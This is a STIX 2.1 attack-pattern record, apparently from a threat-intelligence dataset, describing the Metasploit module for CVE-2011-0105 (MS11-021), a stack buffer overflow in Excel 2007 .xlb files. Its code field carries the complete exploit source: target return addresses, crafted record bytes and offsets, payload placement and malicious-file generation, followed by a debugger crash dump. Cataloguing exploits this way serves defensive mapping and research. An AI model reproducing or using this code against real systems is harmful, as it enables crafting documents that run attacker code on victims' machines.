{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--e9648e43-2465-4bff-986f-af7a7217d011",
    "created": "2024-08-14T16:35:33.799226Z",
    "modified": "2024-08-14T16:35:33.79923Z",
    "name": "\"MS11-021 Microsoft Office 2007 Excel .xlb Buffer Overflow\"",
    "description": " This module exploits a vulnerability found in Excel of Microsoft Office 2007. By supplying a malformed .xlb file, an attacker can control the content (source) of a memcpy routine, and the number of bytes to copy, therefore causing a stack- based buffer overflow.  This results in arbitrary code execution under the context of the user.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/fileformat/ms11_021_xlb_bof.rb",
            "external_id": "ms11_021_xlb_bof.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2011-0105"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = NormalRanking\n\n  include Msf::Exploit::FILEFORMAT\n\n  def initialize(info={})\n    super(update_info(info,\n      'Name'           => \"MS11-021 Microsoft Office 2007 Excel .xlb Buffer Overflow\",\n      'Description'    => %q{\n          This module exploits a vulnerability found in Excel of Microsoft Office 2007.\n        By supplying a malformed .xlb file, an attacker can control the content (source)\n        of a memcpy routine, and the number of bytes to copy, therefore causing a stack-\n        based buffer overflow.  This results in arbitrary code execution under the context of\n        the user.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'Aniway',       # Initial discovery (via ZDI)\n          'Unknown',      # Abysssec, RCA, poc\n          'sinn3r',       # Metasploit\n          'juan vazquez'  # Metasploit\n        ],\n      'References'     =>\n        [\n          ['CVE', '2011-0105'],\n          ['OSVDB', '71765'],\n          ['MSB', 'MS11-021'],\n          ['ZDI', '11-121']\n        ],\n      'Payload'        =>\n        {\n          'StackAdjustment' => -3500,\n        },\n      'DefaultOptions'  =>\n        {\n          'EXITFUNC'          => \"process\",\n          'DisablePayloadHandler' => true,\n          'InitialAutoRunScript'  => 'post/windows/manage/priv_migrate'\n        },\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n          # Win XP SP3 (Vista and 7 will try to repair the file)\n          ['Microsoft Office Excel 2007 on Windows XP',     {'Ret' => 0x3006A48D }], # JMP ESP in EXCEL (Office 2007)\n          ['Microsoft Office Excel 2007 SP2 on Windows XP', {'Ret'=>0x3006b185}],    #JMP ESP in excel\n        ],\n      'Privileged'     => false,\n      'DisclosureDate' => '2011-08-09',\n      'DefaultTarget'  => 0))\n\n      register_options(\n        [\n          OptString.new('FILENAME', [true, 'The filename', 'msf.xlb'])\n        ])\n  end\n\n  def exploit\n    path = File.join(Msf::Config.install_root, 'data', 'exploits', 'CVE-2011-0105.xlb')\n    f = File.open(path, 'rb')\n    template = f.read\n    f.close\n\n    p = payload.encoded\n\n    # Offset 1556\n    record = ''\n    record << \"\\xa7\\x00\"                        #record type\n    record << \"\\x04\\x00\"                        #record length\n    if target.name =~ /Excel 2007 SP2/ # Microsoft Office Excel 2007 SP2\n      record << \"\\xb0\\x0d\\x0c\\x00\"                #data\n    else\n      record << \"\\xb0\\x0f\\x0c\\x00\"                #data\n    end\n\n    # Offset 1564\n    continue_record = ''\n    continue_record << \"\\x3c\\x00\"               #record type\n    continue_record << [p.length+32].pack('v')  #length\n\n    buf  = ''\n    buf << template[0, 1556]\n    buf << record\n    buf << continue_record\n    buf << rand_text_alpha(1)\n    buf << [target.ret].pack('V*')\n    buf << \"\\x00\"*12\n    buf << p\n    buf << template[2336, template.length]\n\n    file_create(buf)\n  end\nend\n\n=begin\n0:000> r\neax=41414141 ebx=00000000 ecx=00000006 edx=008c1504 esi=0000007f edi=00000005\neip=301a263d esp=00137ef8 ebp=00137f6c iopl=0         nv up ei pl nz na pe nc\ncs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010206\nEXCEL!Ordinal40+0x1a263d:\n301a263d 8908            mov     dword ptr [eax],ecx  ds:0023:41414141=????????\n0:000> dc esp\n00137ef8  00000000 00000000 41414141 41414141  ........AAAAAAAA\n00137f08  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA\n00137f18  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA\n00137f28  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA\n00137f38  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA\n00137f48  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA\n00137f58  41414141 41414141 41414141 00000000  AAAAAAAAAAAA....\n00137f68  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA\n=end\n",
    "x_mitre_disclosure_date": "2011-08-09",
    "x_mitre_platforms": [
        "win'"
    ]
}